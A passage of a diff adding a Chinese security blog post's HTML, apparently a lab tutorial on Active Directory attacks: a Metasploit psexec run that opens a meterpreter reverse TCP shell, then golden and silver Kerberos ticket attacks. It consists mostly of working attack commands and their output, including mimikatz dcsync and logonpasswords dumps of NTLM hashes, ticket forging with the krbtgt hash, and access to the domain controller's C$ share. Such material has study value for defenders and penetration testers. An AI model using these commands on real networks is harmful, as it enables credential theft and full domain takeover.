+</span></span><span style=display:flex><span>SMBUser               admin                              no        The username to authenticate as
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Payload options <span style=color:#f92672>(</span>windows/meterpreter/reverse_tcp<span style=color:#f92672>)</span>:
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Name      Current Setting  Required  Description
+</span></span><span style=display:flex><span>----      ---------------  --------  -----------
+</span></span><span style=display:flex><span>EXITFUNC  thread           yes       Exit technique <span style=color:#f92672>(</span>Accepted: <span style=color:#e6db74>&#39;&#39;</span>, seh, thread, process, none<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>LHOST     172.20.10.2      yes       The listen address <span style=color:#f92672>(</span>an interface may be specified<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>LPORT     <span style=color:#ae81ff>4444</span>             yes       The listen port
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Exploit target:
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Id  Name
+</span></span><span style=display:flex><span>--  ----
+</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span>   Automatic
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>View the full module info with the info, or info -d command.
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>msf6 exploit<span style=color:#f92672>(</span>windows/smb/psexec<span style=color:#f92672>)</span> &gt; run
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Started reverse TCP handler on 172.20.10.2:4444
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.11.11.5:445 - Connecting to the server...
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.11.11.5:445 - Authenticating to 10.11.11.5:445|test.com as user <span style=color:#e6db74>&#39;admin&#39;</span>...
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.11.11.5:445 - Selecting native target
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.11.11.5:445 - Uploading payload... qusizJPL.exe
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.11.11.5:445 - Created <span style=color:#ae81ff>\q</span>usizJPL.exe...
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> 10.11.11.5:445 - Service started successfully...
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending stage <span style=color:#f92672>(</span><span style=color:#ae81ff>175686</span> bytes<span style=color:#f92672>)</span> to 172.20.10.2
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> 10.11.11.5:445 - Deleting <span style=color:#ae81ff>\q</span>usizJPL.exe...
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Meterpreter session <span style=color:#ae81ff>7</span> opened <span style=color:#f92672>(</span>172.20.10.2:4444 -&gt; 172.20.10.5:65265<span style=color:#f92672>)</span> at 2023-03-06 14:28:01 +0800
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>meterpreter &gt; ifconfig
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Interface 65539
+</span></span><span style=display:flex><span><span style=color:#f92672>============</span>
+</span></span><span style=display:flex><span>Name         : Parallels Ethernet Adapter
+</span></span><span style=display:flex><span>Hardware MAC : 00:1c:42:5e:07:99
+</span></span><span style=display:flex><span>MTU          : <span style=color:#ae81ff>1500</span>
+</span></span><span style=display:flex><span>IPv4 Address : 10.11.11.5
+</span></span><span style=display:flex><span>IPv4 Netmask : 255.255.255.0
+</span></span></code></pre></div></li></ul><h3 id=0x04-黄金票据>0x04 黄金票据</h3><p>黄金票据是伪造 TGS，一般拿下域控后用来维权，因为 krbtgt 域账户的密码基本不会更改</p><ul><li><p>利用条件</p><ul><li>域名称</li><li>域 SID</li><li>krbtgt NTLM-Hash(需要拿下域控)</li></ul></li><li><p>域内普通用户 shell 获取 DC 名称</p><ul><li><p>改编码</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32&gt;chcp <span style=color:#ae81ff>65001</span>
+</span></span><span style=display:flex><span>chcp <span style=color:#ae81ff>65001</span>
+</span></span><span style=display:flex><span>Active code page: <span style=color:#ae81ff>65001</span>
+</span></span></code></pre></div></li><li><p>net config workstation | findstr domain 得到域名称</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\z</span>hangsan<span style=color:#ae81ff>\D</span>esktop&gt;net config workstation | findstr domain
+</span></span><span style=display:flex><span>net config workstation | findstr domain
+</span></span><span style=display:flex><span>Workstation domain                   TEST
+</span></span><span style=display:flex><span>Logon domain                         TEST
+</span></span></code></pre></div></li><li><p>nltest /dsgetdc:TEST 得到 dc 主机名为 <code>\\WIN-2008</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\z</span>hangsan<span style=color:#ae81ff>\D</span>esktop&gt;nltest /dsgetdc:TEST
+</span></span><span style=display:flex><span>nltest /dsgetdc:TEST
+</span></span><span style=display:flex><span>           DC: <span style=color:#ae81ff>\\</span>WIN-2008
+</span></span><span style=display:flex><span>      Address: <span style=color:#ae81ff>\\</span>10.11.11.5
+</span></span><span style=display:flex><span>     Dom Guid: 319da0ce-39fd-4861-8e18-6a2264cfe874
+</span></span><span style=display:flex><span>     Dom Name: TEST
+</span></span><span style=display:flex><span>  Forest Name: test.com
+</span></span><span style=display:flex><span> Dc Site Name: Default-First-Site-Name
+</span></span><span style=display:flex><span>Our Site Name: Default-First-Site-Name
+</span></span><span style=display:flex><span>        Flags: PDC GC DS LDAP KDC TIMESERV GTIMESERV WRITABLE DNS_FOREST CLOSE_SITE FULL_SECRET WS
+</span></span><span style=display:flex><span>The command completed successfully
+</span></span></code></pre></div></li></ul></li><li><p>域内普通用户获取域 SID</p><ul><li><p>kiwi_cmd token::whoami</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>meterpreter &gt; kiwi_cmd token::whoami
+</span></span><span style=display:flex><span> * Process Token : <span style=color:#f92672>{</span>0;0001a410<span style=color:#f92672>}</span> <span style=color:#ae81ff>1</span> D <span style=color:#ae81ff>111721</span>    	TEST<span style=color:#ae81ff>\z</span>hangsan	S-1-5-21-3160176211-3702513722-812664031-1118	<span style=color:#f92672>(</span>10g,05p<span style=color:#f92672>)</span>	Primary
+</span></span><span style=display:flex><span> * Thread Token  : no token
+</span></span></code></pre></div></li><li><p>whoami /user</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32&gt;whoami /user
+</span></span><span style=display:flex><span>whoami /user
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>USER INFORMATION
+</span></span><span style=display:flex><span>----------------
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>User Name     SID
+</span></span><span style=display:flex><span><span style=color:#f92672>=============</span> <span style=color:#f92672>=============================================</span>
+</span></span><span style=display:flex><span>test<span style=color:#ae81ff>\z</span>hangsan S-1-5-21-3160176211-3702513722-812664031-1118
+</span></span></code></pre></div></li><li><p>wmic useraccount get name,sid</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\z</span>hangsan<span style=color:#ae81ff>\D</span>esktop&gt;wmic useraccount get name,sid
+</span></span><span style=display:flex><span>wmic useraccount get name,sid
+</span></span><span style=display:flex><span>Name           SID
+</span></span><span style=display:flex><span>Administrator  S-1-5-21-2772043085-310273303-638560154-500
+</span></span><span style=display:flex><span>Guest          S-1-5-21-2772043085-310273303-638560154-501
+</span></span><span style=display:flex><span>reber          S-1-5-21-2772043085-310273303-638560154-1000
+</span></span><span style=display:flex><span>Administrator  S-1-5-21-3160176211-3702513722-812664031-500
+</span></span><span style=display:flex><span>Guest          S-1-5-21-3160176211-3702513722-812664031-501
+</span></span><span style=display:flex><span>krbtgt         S-1-5-21-3160176211-3702513722-812664031-502
+</span></span><span style=display:flex><span>zhangsan       S-1-5-21-3160176211-3702513722-812664031-1118
+</span></span><span style=display:flex><span>lisi           S-1-5-21-3160176211-3702513722-812664031-1126
+</span></span><span style=display:flex><span>admin          S-1-5-21-3160176211-3702513722-812664031-1128
+</span></span></code></pre></div></li></ul></li><li><p>域内管理员组用户权限获取 krbtgt NTLM-Hash</p><p>kiwi 模块同时支持 32 位和 64 位操作系统，默认加载是 32 位操作系统<br>如果当前 session 为 x86，dc 为 x64，则要先注入到 x64</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>meterpreter &gt; load kiwi
+</span></span><span style=display:flex><span>Success.
+</span></span><span style=display:flex><span>meterpreter &gt; kiwi_cmd lsadump::dcsync /domain:test.com /all /csv
+</span></span><span style=display:flex><span><span style=color:#ae81ff>502</span>        krbtgt  3f92886413f9d4ab78e03c6275a71b85  <span style=color:#ae81ff>514</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>1127</span>     WIN2003$  5ad1bf868f8ddbe900c15dfe82e6c08e  <span style=color:#ae81ff>4096</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>1008</span>    WIN-2008$  f048fbe3fc1722d6a83388364dab9cdc  <span style=color:#ae81ff>532480</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>500</span> Administrator  0e032b9d51a580ac6cdfabad8bc97a38  <span style=color:#ae81ff>512</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>1118</span>     zhangsan  993ca38cf7795d31bc429a8b9903a01a  <span style=color:#ae81ff>66048</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>1126</span>         lisi  6447286bfde2f1ac790331e33b819657  <span style=color:#ae81ff>66048</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>1123</span>    WIN7PRO2$  c4f03bb85e00c17788e8d9ee5c60aef0  <span style=color:#ae81ff>4096</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>1122</span>     WIN7PRO$  2d688c9797ca9f14639c541f289479ed  <span style=color:#ae81ff>4096</span>
+</span></span><span style=display:flex><span><span style=color:#ae81ff>1128</span>        admin  209c6174da490caeb422f3fa5a7ae634  <span style=color:#ae81ff>66048</span>
+</span></span></code></pre></div></li><li><p>域内管理员组用户权限生成票据</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>meterpreter &gt; golden_ticket_create -d test.com -s S-1-5-21-3160176211-3702513722-812664031 -k 3f92886413f9d4ab78e03c6275a71b85 -u abc -t /tmp/abc.kirbi
+</span></span></code></pre></div></li><li><p>域内普通用户导入票据</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>meterpreter &gt; getuid
+</span></span><span style=display:flex><span>Server username: TEST<span style=color:#ae81ff>\z</span>hangsan
+</span></span><span style=display:flex><span>meterpreter &gt; kerberos_ticket_purge
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Kerberos tickets purged
+</span></span><span style=display:flex><span>meterpreter &gt; kerberos_ticket_use /tmp/abc.kirbi
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Using Kerberos ticket stored in /tmp/abc.kirbi, <span style=color:#ae81ff>1820</span> bytes ...
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Kerberos ticket applied successfully.
+</span></span><span style=display:flex><span>meterpreter &gt; kerberos_ticket_list
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Kerberos tickets found in the current session.
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>00000000<span style=color:#f92672>]</span> - 0x00000017 - rc4_hmac_nt
+</span></span><span style=display:flex><span>   Start/End/MaxRenew: 2023/3/24 4:11:16 ; 2033/3/21 12:11:16 ; 2033/3/21 12:11:16
+</span></span><span style=display:flex><span>   Server Name       : krbtgt/test.com @ test.com
+</span></span><span style=display:flex><span>   Client Name       : abc @ test.com
+</span></span><span style=display:flex><span>   Flags 40e00000    : pre_authent ; initial ; renewable ; forwardable ;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>meterpreter &gt; shell
+</span></span><span style=display:flex><span>Process <span style=color:#ae81ff>3796</span> created.
+</span></span><span style=display:flex><span>Channel <span style=color:#ae81ff>2</span> created.
+</span></span><span style=display:flex><span>Microsoft Windows <span style=color:#f92672>[</span>�汾 6.1.7600<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>��Ȩ���� <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2009</span> Microsoft Corporation����������Ȩ��
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\z</span>hangsan<span style=color:#ae81ff>\D</span>esktop&gt;chcp <span style=color:#ae81ff>65001</span>
+</span></span><span style=display:flex><span>chcp <span style=color:#ae81ff>65001</span>
+</span></span><span style=display:flex><span>Active code page: <span style=color:#ae81ff>65001</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\z</span>hangsan<span style=color:#ae81ff>\D</span>esktop&gt;dir <span style=color:#ae81ff>\\</span>WIN-2008<span style=color:#ae81ff>\C</span>$
+</span></span><span style=display:flex><span>dir <span style=color:#ae81ff>\\</span>WIN-2008<span style=color:#ae81ff>\C</span>$
+</span></span><span style=display:flex><span> Volume in drive <span style=color:#ae81ff>\\</span>WIN-2008<span style=color:#ae81ff>\C</span>$ has no label.
+</span></span><span style=display:flex><span> Volume Serial Number is B08C-EB53
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> Directory of <span style=color:#ae81ff>\\</span>WIN-2008<span style=color:#ae81ff>\C</span>$
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>2009/07/13  20:20    &lt;DIR&gt;          PerfLogs
+</span></span><span style=display:flex><span>2018/07/26  21:51    &lt;DIR&gt;          Program Files
+</span></span><span style=display:flex><span>2023/03/02  20:45    &lt;DIR&gt;          Program Files <span style=color:#f92672>(</span>x86<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>2017/09/12  20:49    &lt;DIR&gt;          Users
+</span></span><span style=display:flex><span>2023/03/06  00:44    &lt;DIR&gt;          Windows
+</span></span><span style=display:flex><span>               <span style=color:#ae81ff>0</span> File<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>              <span style=color:#ae81ff>0</span> bytes
+</span></span><span style=display:flex><span>               <span style=color:#ae81ff>5</span> Dir<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>  124,080,254,976 bytes free
+</span></span></code></pre></div></li></ul><h3 id=0x05-白银票据>0x05 白银票据</h3><p>白银票据是伪造 TGS，不会经过 KDC，更加隐蔽，但权限就远不如黄金票据</p><ul><li><p>可利用服务</p><table><thead><tr><th>服务</th><th>服务名</th></tr></thead><tbody><tr><td>WMI</td><td>HOST、RPCSS</td></tr><tr><td>PowerShell Remoting</td><td>HOST、HTTP</td></tr><tr><td>WinRM</td><td>HOST、HTTP</td></tr><tr><td>Scheduled Tasks</td><td>HOST</td></tr><tr><td>Windows File Share (CIFS)</td><td>CIFS</td></tr><tr><td>LDAP、DCSync</td><td>LDAP</td></tr><tr><td>Windows Remote Server</td><td>RPCSS、LDAP、CIFS</td></tr></tbody></table></li><li><p>利用条件</p><ul><li>域名称</li><li>域 SID</li><li>服务账号的 NTLM-Hash</li><li>目标服务器 FQDN</li><li>可利用的服务</li></ul></li><li><p>域内用户 SYSTEM 权限获取域名称、SID、NTLM-Hash</p><p>Domain : TEST<br>User Server : DC$<br>SID : S-1-5-21-3160176211-3702513722-812664031<br>NTLM : 993ca38cf7795d31bc429a8b9903a01a</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>meterpreter &gt; getuid
+</span></span><span style=display:flex><span>Server username: NT AUTHORITY<span style=color:#ae81ff>\S</span>YSTEM
+</span></span><span style=display:flex><span>meterpreter &gt; load kiwi
+</span></span><span style=display:flex><span>Success.
+</span></span><span style=display:flex><span>meterpreter &gt; kiwi_cmd sekurlsa::logonpasswords
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Authentication Id : <span style=color:#ae81ff>0</span> ; <span style=color:#ae81ff>996</span> <span style=color:#f92672>(</span>00000000:000003e4<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Session           : Service from <span style=color:#ae81ff>0</span>
+</span></span><span style=display:flex><span>User Name         : DC$
+</span></span><span style=display:flex><span>Domain            : TEST
+</span></span><span style=display:flex><span>Logon Server      : <span style=color:#f92672>(</span>null<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>Logon Time        : 2023/3/25 10:42:15
+</span></span><span style=display:flex><span>SID               : S-1-5-20
+</span></span><span style=display:flex><span>	msv :
+</span></span><span style=display:flex><span>	 <span style=color:#f92672>[</span>00000003<span style=color:#f92672>]</span> Primary
+</span></span><span style=display:flex><span>	 * Username : DC$
+</span></span><span style=display:flex><span>	 * Domain   : TEST
+</span></span><span style=display:flex><span>	 * NTLM     : 993ca38cf7795d31bc429a8b9903a01a
+</span></span><span style=display:flex><span>	 * SHA1     : 104c7eec951d84ce412bd21e123b67520688f570
+</span></span><span style=display:flex><span>meterpreter &gt; shell
+</span></span><span style=display:flex><span>Process <span style=color:#ae81ff>2732</span> created.
+</span></span><span style=display:flex><span>Channel <span style=color:#ae81ff>3</span> created.
+</span></span><span style=display:flex><span>Microsoft Windows <span style=color:#f92672>[</span>�汾 6.1.7600<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>��Ȩ���� <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2009</span> Microsoft Corporation����������Ȩ��
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\s</span>ystem32&gt;wmic useraccount get name,sid
+</span></span><span style=display:flex><span>wmic useraccount get name,sid
+</span></span><span style=display:flex><span>Name           SID
+</span></span><span style=display:flex><span>Administrator  S-1-5-21-3160176211-3702513722-812664031-500
+</span></span><span style=display:flex><span>Guest          S-1-5-21-3160176211-3702513722-812664031-501
+</span></span><span style=display:flex><span>krbtgt         S-1-5-21-3160176211-3702513722-812664031-502
+</span></span><span style=display:flex><span>zhangsan       S-1-5-21-3160176211-3702513722-812664031-1118
+</span></span><span style=display:flex><span>lisi           S-1-5-21-3160176211-3702513722-812664031-1126
+</span></span><span style=display:flex><span>admin          S-1-5-21-3160176211-3702513722-812664031-1128
+</span></span></code></pre></div></li><li><p>域内普通用户权限直接导入票据</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>meterpreter &gt; getuid
+</span></span><span style=display:flex><span>Server username: TEST<span style=color:#ae81ff>\z</span>hangsan
+</span></span><span style=display:flex><span>meterpreter &gt; kerberos_ticket_purge
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Kerberos tickets purged
+</span></span><span style=display:flex><span>meterpreter &gt; kiwi_cmd kerberos::golden /domain:test.com /sid:S-1-5-21-3160176211-3702513722-812664031 /target:dc.test.com /service:cifs /rc4:993ca38cf7795d31bc429a8b9903a01a /user:abc /ptt
+</span></span><span style=display:flex><span>User      : abc
+</span></span><span style=display:flex><span>Domain    : test.com <span style=color:#f92672>(</span>TEST<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>SID       : S-1-5-21-3160176211-3702513722-812664031
+</span></span><span style=display:flex><span>User Id   : <span style=color:#ae81ff>500</span>
+</span></span><span style=display:flex><span>Groups Id : *513 <span style=color:#ae81ff>512</span> <span style=color:#ae81ff>520</span> <span style=color:#ae81ff>518</span> <span style=color:#ae81ff>519</span>
+</span></span><span style=display:flex><span>ServiceKey: 993ca38cf7795d31bc429a8b9903a01a - rc4_hmac_nt
+</span></span><span style=display:flex><span>Service   : cifs
+</span></span><span style=display:flex><span>Target    : dc.test.com
+</span></span><span style=display:flex><span>Lifetime  : 2023/3/24 22:30:08 ; 2033/3/21 22:30:08 ; 2033/3/21 22:30:08
+</span></span><span style=display:flex><span>-&gt; Ticket : ** Pass The Ticket **
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> * PAC generated
+</span></span><span style=display:flex><span> * PAC signed
+</span></span><span style=display:flex><span> * EncTicketPart generated
+</span></span><span style=display:flex><span> * EncTicketPart encrypted
+</span></span><span style=display:flex><span> * KrbCred generated
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>Golden ticket <span style=color:#66d9ef>for</span> <span style=color:#e6db74>&#39;abc @ test.com&#39;</span> successfully submitted <span style=color:#66d9ef>for</span> current session
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>meterpreter &gt; kerberos_ticket_list
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Kerberos tickets found in the current session.
+</span></span><span style=display:flex><span><span style=color:#f92672>[</span>00000000<span style=color:#f92672>]</span> - 0x00000017 - rc4_hmac_nt
+</span></span><span style=display:flex><span>   Start/End/MaxRenew: 2023/3/24 22:30:08 ; 2033/3/21 22:30:08 ; 2033/3/21 22:30:08
+</span></span><span style=display:flex><span>   Server Name       : cifs/dc.test.com @ test.com
+</span></span><span style=display:flex><span>   Client Name       : abc @ test.com
+</span></span><span style=display:flex><span>   Flags 40a00000    : pre_authent ; renewable ; forwardable ;
+</span></span></code></pre></div><p>导入白银票据后可直接查看域控的 C 盘文件</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>meterpreter &gt; shell
+</span></span><span style=display:flex><span>Process <span style=color:#ae81ff>2004</span> created.
+</span></span><span style=display:flex><span>Channel <span style=color:#ae81ff>1</span> created.
+</span></span><span style=display:flex><span>Microsoft Windows <span style=color:#f92672>[</span>�汾 6.1.7600<span style=color:#f92672>]</span>
+</span></span><span style=display:flex><span>��Ȩ���� <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2009</span> Microsoft Corporation����������Ȩ��
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\z</span>hangsan<span style=color:#ae81ff>\D</span>esktop&gt;chcp <span style=color:#ae81ff>65001</span>
+</span></span><span style=display:flex><span>chcp <span style=color:#ae81ff>65001</span>
+</span></span><span style=display:flex><span>Active code page: <span style=color:#ae81ff>65001</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>C:<span style=color:#ae81ff>\U</span>sers<span style=color:#ae81ff>\z</span>hangsan<span style=color:#ae81ff>\D</span>esktop&gt;dir <span style=color:#ae81ff>\\</span>win-2008<span style=color:#ae81ff>\c</span>$
+</span></span><span style=display:flex><span>dir <span style=color:#ae81ff>\\</span>win-2008<span style=color:#ae81ff>\c</span>$
+</span></span><span style=display:flex><span> Volume in drive <span style=color:#ae81ff>\\</span>win-2008<span style=color:#ae81ff>\c</span>$ has no label.
+</span></span><span style=display:flex><span> Volume Serial Number is B08C-EB53
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span> Directory of <span style=color:#ae81ff>\\</span>win-2008<span style=color:#ae81ff>\c</span>$
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>2009/07/13  20:20    &lt;DIR&gt;          PerfLogs
+</span></span><span style=display:flex><span>2018/07/26  21:51    &lt;DIR&gt;          Program Files
+</span></span><span style=display:flex><span>2023/03/02  20:45    &lt;DIR&gt;          Program Files <span style=color:#f92672>(</span>x86<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>2017/09/12  20:49    &lt;DIR&gt;          Users
+</span></span><span style=display:flex><span>2023/03/06  00:44    &lt;DIR&gt;          Windows
+</span></span><span style=display:flex><span>               <span style=color:#ae81ff>0</span> File<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>              <span style=color:#ae81ff>0</span> bytes
+</span></span><span style=display:flex><span>               <span style=color:#ae81ff>5</span> Dir<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span>  124,094,062,592 bytes free
+</span></span></code></pre></div></li></ul><h4 id=reference侵删>Reference(侵删)：</h4><ul><li><a href=https://www.cnblogs.com/howtime/p/12498608.html?_blank>https://www.cnblogs.com/howtime/p/12498608.html</a></li><li><a href=https://blog.csdn.net/weixin_60109175/article/details/123971841?_blank>https://blog.csdn.net/weixin_60109175/article/details/123971841</a></li><li><a href=https://txluck.github.io/2022/03/04/%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE%E5%92%8C%E7%99%BD%E9%93%B6%E7%A5%A8%E6%8D%AE/?_blank>https://txluck.github.io/2022/03/04/黄金票据和白银票据/</a></li><li><a href=https://zhuanlan.zhihu.com/p/501491931?_blank>https://zhuanlan.zhihu.com/p/501491931</a></li></ul></div></article></main></div><footer><hr><p id=social>Find me around the web:
+<a href=https://github.com/reber0?_blank>GitHub</a>
+•
+<a href=https://weibo.com/u/5819760166?_blank>Weibo</a></p><p class=copyright>Copyright © 2015-2025
+<a href=https://wyb0.com/><strong>Reber</strong></a>.
+Built with
+<a href=http://www.gohugo.io/>Hugo</a>,
+based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>.</p></footer></body></html>
